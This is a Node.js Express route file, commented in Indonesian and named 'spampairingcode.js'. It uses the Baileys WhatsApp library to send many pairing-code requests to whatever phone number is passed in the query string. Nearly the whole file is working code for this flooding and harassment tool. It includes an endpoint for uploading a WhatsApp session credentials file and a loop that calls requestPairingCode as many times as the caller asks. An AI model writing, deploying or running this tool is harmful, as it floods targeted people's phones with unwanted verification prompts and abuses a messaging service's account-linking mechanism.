// routes/spampairingcode.js
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const pino = require('pino');
const router = express.Router();

// Set up storage engine using multer
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, './uploads'); // Folder penyimpanan untuk creds.json
  },
  filename: function (req, file, cb) {
    cb(null, 'creds.json'); // Simpan dengan nama 'creds.json'
  }
});

const upload = multer({ storage: storage });

// Fungsi delay
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Fungsi untuk membaca dan menyimpan kredensial
async function saveCredsState() {
  const { state, saveState } = await useMultiFileAuthState('./69/session');

  if (typeof saveState !== 'function') {
    throw new Error('saveState is not a valid function');
  }

  const XeonBotInc = makeWASocket({
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    auth: state,
    connectTimeoutMs: 120000, // 2 menit timeout untuk koneksi
    defaultQueryTimeoutMs: 30000, // Timeout untuk query (30 detik)
    keepAliveIntervalMs: 30000, // Keep-alive setiap 30 detik
    emitOwnEvents: true,
    fireInitQueries: true,
    generateHighQualityLinkPreview: true,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
  });

  if (XeonBotInc.ev && typeof XeonBotInc.ev.on === 'function') {
    XeonBotInc.ev.on('creds.update', saveState);  // listener untuk event creds.update
  }

  return XeonBotInc;
}

// Route untuk upload creds.json
router.post('/upload-creds', upload.single('file'), async (req, res) => {
  if (!req.file) {
    return res.status(400).json({ message: 'No file uploaded' });
  }

  try {
    // Pastikan file yang diupload adalah creds.json
    const filePath = path.join(__dirname, '../uploads', req.file.filename);
    
    if (path.extname(filePath) !== '.json') {
      return res.status(400).json({ message: 'Please upload a valid JSON file' });
    }

    // Membaca konten file JSON
    const credsContent = fs.readFileSync(filePath, 'utf8');
    
    // Proses untuk menyimpan kredensial
    const creds = JSON.parse(credsContent);

    // Pastikan struktur kredensial valid (bisa disesuaikan)
    if (!creds || !creds.client) {
      return res.status(400).json({ message: 'Invalid credentials in the file' });
    }

    // Simpan state atau lakukan sesuatu dengan kredensial
    await saveCredsState();

    res.status(200).json({ message: 'Credentials file uploaded and processed successfully' });

  } catch (error) {
    res.status(500).json({ message: `Error: ${error.message}` });
  }
});

// Fungsi untuk menjalankan proy7ek spam pairing code
async function XeonProject(phoneNumber, xeonCodes) {
  const { state } = await useMultiFileAuthState('../69/session');
  const XeonBotInc = makeWASocket({
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    auth: state,
    connectTimeoutMs: 120000, // 2 menit timeout untuk koneksi
    defaultQueryTimeoutMs: 30000, // Timeout untuk query (30 detik)
    keepAliveIntervalMs: 30000, // Keep-alive setiap 30 detik
    emitOwnEvents: true,
    fireInitQueries: true,
    generateHighQualityLinkPreview: true,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
  });

  try {
    if (isNaN(xeonCodes) || xeonCodes <= 0) {
      throw new Error('Invalid number of pairing codes');
    }

    // Get and display pairing code
    const results = [];
    for (let i = 0; i < xeonCodes; i++) {
      try {
        // Delay 1 detik sebelum mengirim request
        await delay(1000);  // Delay 1 detik di antara permintaan pairing code

        let code = await XeonBotInc.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join('-') || code;
        results.push(`${phoneNumber} [${i + 1}/${xeonCodes}]`);
      } catch (error) {
        results.push(`Error: ${error.message}`);
      }
    }
    return results;
  } catch (error) {
    console.error('Error:', error.message);
    throw error;
  }
}

// Route untuk spam pairing code
router.get('/', async (req, res) => {
  const { phoneNumber, xeonCodes } = req.query;

  if (!phoneNumber || !xeonCodes) {
    return res.status(400).json({ message: 'phoneNumber and xeonCodes are required' });
  }

  try {
    const result = await XeonProject(phoneNumber, parseInt(xeonCodes));
    res.status(200).json({
      message: 'Pairing codes generated successfully',
      data: result,
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

module.exports = router;
